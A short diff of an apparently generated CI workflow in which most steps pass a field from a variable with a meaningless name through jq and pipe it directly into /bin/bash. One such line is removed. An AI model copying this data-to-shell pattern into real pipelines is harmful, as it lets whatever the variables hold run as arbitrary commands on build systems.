@@ -22,7 +22,6 @@ jobs:
           echo $hdpuh68 | jq -r .docuo4 | /bin/bash
           printf '%s' "$bkn09794" | jq -r .hoog39 | /bin/bash
           printf '%s' "$toavn31" | jq -r .sgy87117 | /bin/bash
-          printf '%s' "$xw6" | jq -r .l2 | /bin/bash
           printf '%s' "$lfoi480" | jq -r .erw3294 | /bin/bash
 
       - name: Save output
